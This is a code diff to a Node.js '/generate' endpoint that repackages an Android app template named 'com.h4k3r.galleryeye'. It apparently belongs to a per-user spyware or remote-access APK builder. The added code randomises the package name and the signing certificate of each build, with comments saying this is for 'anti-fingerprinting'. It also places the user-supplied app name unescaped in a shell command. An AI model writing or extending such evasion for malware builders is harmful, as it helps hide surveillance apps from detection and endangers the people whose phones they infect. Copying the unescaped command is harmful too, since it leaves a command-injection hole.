@@ -123,6 +123,57 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
             }
 
+            // 2.5. Randomize Package Name for anti-fingerprinting
+            await sendUpdate('apk_progress', { step: 'Applying security enhancements...', progress: 35 });
+            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
+            const apktoolYmlPath = path.join(workDir, 'apktool.yml');
+
+            // Generate random package suffix based on app name and random chars
+            const cleanAppName = (appName || 'app').toLowerCase().replace(/[^a-z0-9]/g, '');
+            const randomSuffix = Math.random().toString(36).substring(2, 6);
+            const newPackageName = `com.${cleanAppName}.${randomSuffix}`;
+            const oldPackageName = 'com.h4k3r.galleryeye';
+
+            // Update AndroidManifest.xml
+            if (fs.existsSync(manifestPath)) {
+                let manifestContent = fs.readFileSync(manifestPath, 'utf8');
+                // Replace package name throughout manifest
+                manifestContent = manifestContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
+                fs.writeFileSync(manifestPath, manifestContent);
+                console.log(`[APK] Package renamed: ${oldPackageName} -> ${newPackageName}`);
+            }
+
+            // Update apktool.yml
+            if (fs.existsSync(apktoolYmlPath)) {
+                let ymlContent = fs.readFileSync(apktoolYmlPath, 'utf8');
+                ymlContent = ymlContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
+                fs.writeFileSync(apktoolYmlPath, ymlContent);
+            }
+
+            // Rename smali directories
+            const smaliDir = path.join(workDir, 'smali', 'com', 'h4k3r', 'galleryeye');
+            const smaliClassesDir = path.join(workDir, 'smali_classes3', 'com', 'h4k3r', 'galleryeye');
+
+            const updateSmaliFiles = (dir) => {
+                if (!fs.existsSync(dir)) return;
+                const files = fs.readdirSync(dir, { withFileTypes: true });
+                for (const file of files) {
+                    const filePath = path.join(dir, file.name);
+                    if (file.isDirectory()) {
+                        updateSmaliFiles(filePath);
+                    } else if (file.name.endsWith('.smali')) {
+                        let content = fs.readFileSync(filePath, 'utf8');
+                        content = content.replace(new RegExp(oldPackageName.replace(/\./g, '/'), 'g'), newPackageName.replace(/\./g, '/'));
+                        content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
+                        fs.writeFileSync(filePath, content);
+                    }
+                }
+            };
+
+            updateSmaliFiles(path.join(workDir, 'smali'));
+            updateSmaliFiles(path.join(workDir, 'smali_classes2'));
+            updateSmaliFiles(path.join(workDir, 'smali_classes3'));
+
             // 3. Inject Config with permission flags
             await sendUpdate('apk_progress', { step: 'Injecting unique user identity...', progress: 45 });
             const assetsDir = path.join(workDir, 'assets');
@@ -138,7 +189,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));
 
             // 3.5. Dynamically inject permissions into AndroidManifest.xml
-            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
+            // manifestPath already defined above
             if (fs.existsSync(manifestPath)) {
                 let manifestContent = fs.readFileSync(manifestPath, 'utf8');
 
@@ -210,14 +261,44 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             }
 
             // 5. Build
-            await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 75 });
+            await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 70 });
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Sign
-            await sendUpdate('apk_progress', { step: 'Signing with secure production key...', progress: 90 });
-            const keystore = path.join(__dirname, 'assets', 'keystore.jks');
+            // 6. Generate UNIQUE keystore for this build
+            await sendUpdate('apk_progress', { step: 'Generating unique signing key...', progress: 80 });
+
+            // Random organization details to avoid fingerprinting
+            const randomOrgs = ['Tech Solutions', 'Mobile Apps', 'App Studio', 'Digital Works', 'Soft Dev', 'App Factory', 'Code Labs', 'Smart Apps'];
+            const randomCities = ['San Francisco', 'New York', 'London', 'Berlin', 'Tokyo', 'Sydney', 'Toronto', 'Paris'];
+            const randomCountries = ['US', 'GB', 'DE', 'JP', 'AU', 'CA', 'FR', 'NL'];
+
+            const orgName = randomOrgs[Math.floor(Math.random() * randomOrgs.length)];
+            const cityName = randomCities[Math.floor(Math.random() * randomCities.length)];
+            const countryCode = randomCountries[Math.floor(Math.random() * randomCountries.length)];
+            const randomAlias = 'key' + Math.floor(Math.random() * 9999);
+            const randomPass = 'pass' + Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
+
+            const dynamicKeystore = path.join(tempDir, `keystore_${uuid}.jks`);
+            const dname = `CN=${appName || 'App'}, OU=${orgName}, O=${orgName}, L=${cityName}, ST=${cityName}, C=${countryCode}`;
+
+            const keytoolCmd = `keytool -genkeypair -v -keystore "${dynamicKeystore}" -alias ${randomAlias} -keyalg RSA -keysize 2048 -validity 10000 -storepass ${randomPass} -keypass ${randomPass} -dname "${dname}"`;
+
+            await new Promise((resolve, reject) => {
+                exec(keytoolCmd, { timeout: 60000 }, (err, stdout, stderr) => {
+                    if (err) {
+                        console.error('[APK] Keytool error:', stderr);
+                        reject(err);
+                    } else {
+                        console.log('[APK] Dynamic keystore generated');
+                        resolve();
+                    }
+                });
+            });
+
+            // 7. Sign with dynamic keystore
+            await sendUpdate('apk_progress', { step: 'Signing with unique key...', progress: 90 });
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-            const cmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${keystore}" --ksAlias key0 --ksPass android --ksKeyPass android`;
+            const cmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${dynamicKeystore}" --ksAlias ${randomAlias} --ksPass ${randomPass} --ksKeyPass ${randomPass}`;
 
             await new Promise((resolve, reject) => {
                 exec(cmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
